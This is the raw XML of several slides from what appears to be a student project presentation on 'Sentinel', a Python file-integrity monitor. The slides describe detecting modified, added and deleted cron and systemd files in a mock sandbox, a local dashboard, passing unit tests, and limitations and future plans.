            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Python 3.14 (Core Runtime Engine):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  Zero external dependencies. Entire engine is implemented using pure Python Standard Library modules:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - hashlib: Streaming chunk-by-chunk SHA-256 cryptographic hashing to prevent memory spikes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - difflib: Generating unified line-by-line diffs (+/- lines) for textual configuration files.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - http.server &amp; urllib: Lightweight web server serving the dashboard and REST JSON endpoints.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - json &amp; dataclasses: Structured serialization of baselines, detection events, and telemetry.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - os, stat &amp; glob: Cross-platform POSIX filesystem traversal, lstat metadata, and permission inspection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - unittest: Built-in automated unit testing framework for test-driven verification.</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 Frontend Technologies (SOC Cyber Dashboard):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Semantic HTML5 &amp; Responsive CSS3: Custom dark-theme Security Operations Center (SOC) visualizer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Vanilla JavaScript: Asynchronous polling (/api/status, /api/events), client-side filtering, diff modal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Completely Offline: No external CDNs or internet connectivity required; operates locally on 127.0.0.1.</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 Development &amp; Management Tooling:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Windows PowerShell 5.1 &amp; manage.py: Unified CLI interface for baseline, scan, simulation, and reset.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3113799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3BBFE1-C8CB-A839-F64F-1A21280B3F47}"/>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Working Methodology &amp; Lifecycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7072766F-036B-A79A-788A-44032B0730E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2648" y="1143000"/>
            <a:ext cx="7924800" cy="5080000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="891775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E71733-D5D4-C9DC-B98E-0839A6949B9D}"/>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Change Detection Demonstration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64C1DA16-E8DC-756A-8E25-975141D786A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3493264"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Three Primary State Changes Detected by Sentinel:</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1. MODIFIED (Content Alteration):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Scenario: A harmless demonstration entry was appended to mock_linux/etc/crontab.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Detection: SHA-256 digest changed from baseline value.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Output: Flagged as [DEMO] MODIFIED with severity HIGH, mapped to MITRE T1053.003.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Diff Preview: Baseline lines vs current lines showing injected text.</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2. ADDED (New Persistence Vector):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Scenario: Tested creation of rogue drop-in cron task mock_linux/etc/cron.d/demo_backup.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Detection: File was absent in baseline.json (exists=false) but present during active scan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Output: Flagged as [DEMO] ADDED with severity HIGH and content preview.</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3. DELETED (Persistence / Service Removal):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Scenario: Tested deletion of mock_linux/etc/systemd/system/sample.service.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Detection: File existed in baseline (exists=true) but is missing on current filesystem.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>   - Output: Flagged as [DEMO] DELETED with former hash recorded.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4043883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31DA81-F6C9-B8BD-22D4-2540BDC6AA64}"/>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SOC Cyber Dashboard &amp; Visual Telemetry</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{639E2B1A-09AD-2A18-AB10-918091198A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2648" y="1079500"/>
            <a:ext cx="7924800" cy="4381500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43BDCC44-DF7E-2119-6B77-41BA286273ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="5524500"/>
            <a:ext cx="7924800" cy="623248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Verified Dashboard Telemetry: Displays Sentinel monitoring status, baseline file count (23 items), active changes, severity breakdown, and live event table. Notice the prominent [DEMO MODE] banner and [DEMO] badge for mock_linux testing. Clicking 'View Diff' opens a syntax-highlighted line diff modal.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1401404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F91866-8BA9-F8B7-1E6F-E3C3154847F8}"/>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Testing, Validation &amp; Verified Results</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{233986C3-A7B7-E535-888C-2D08187C22AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="3093154"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Automated Unit Test Suite (tests/test_detector.py):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Executed with Python's built-in unittest framework in isolated temporary sandbox directories.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Result: 4 / 4 Test Cases Passed in 0.049 seconds (Zero Errors, Zero Failures).</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  Test Case Summary:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  1. test_clean_scan_no_changes: Verifies clean filesystem yields exactly 0 false positives. [PASSED]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  2. test_detect_modified_file: Verifies crontab edit generates MODIFIED event + diff. [PASSED]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  3. test_detect_added_file: Verifies rogue file in cron.d triggers ADDED event. [PASSED]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  4. test_detect_deleted_file: Verifies service deletion triggers DELETED event. [PASSED]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- End-to-End CLI &amp; Management Validation:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Baseline Creation: Successfully cataloged 6 existing files and 17 absent target vectors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Clean Scan: Returned 0 changes against clean baseline snapshot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Simulation &amp; Triage: Appended mock comment -&gt; accurately flagged HIGH severity + diff.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  - Self-Healing Reset: python manage.py reset restored clean baseline state with 0 events.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1773532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25954E-67AA-1E72-15B9-D2EA1A4056A0}"/>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Critical Limitations &amp; Future Scope</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF5CCE05-69CB-68C0-D493-35B398583ED8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1270000"/>
            <a:ext cx="8153400" cy="2492990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Critical Technical Limitations of Current Prototype:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  1. Windows Mock Sandbox: Tested on Windows using mock_linux/, not on a live production Linux kernel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  2. Simulated Harmless Changes: Test edits are benign comments, not real weaponized rootkits.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  3. Rule-Based Threat Labels: A HIGH severity tag indicates vector criticality, not proof of malice.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  4. Polling vs Real-Time Kernel Hooks: Operates via periodic or on-demand scans rather than inotify.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1300">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Future Scope &amp; Engineering Roadmap:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  1. Native Linux Kernel Integration: Deploy on Ubuntu/Kali Linux using real /etc/ and inotify / auditd hooks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  2. Real-Time Security Alerting: Forward JSON telemetry to SIEM (Splunk, Elastic) and Discord/Slack webhooks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  3. Baseline Whitelisting &amp; Approvals: Administrative GUI workflow to approve authorized package updates.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  4. Expanded Persistence Matrix: Integration of kernel module inspection (modprobe.d) and PAM backdoors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  5. Enterprise Packaging: Deployment via hardened systemd background service and Docker containers.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1624714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26C0EC-0A85-5577-4CFF-C71C21A9F4DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="228600"/>
            <a:ext cx="8153400" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Conclusion &amp; Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2632EA7-CA2D-BDF6-F256-046B709EEE11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1397000"/>
            <a:ext cx="8153400" cy="3624069"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Summary of Project Contributions:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Functional Prototype Delivered: Working file integrity auditor and change detection prototype.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Academic Rigor &amp; Safety: Evaluated in a safe mock sandbox on Windows; zero external dependencies.</a:t>
            </a:r>
          </a:p>
          <a:p>
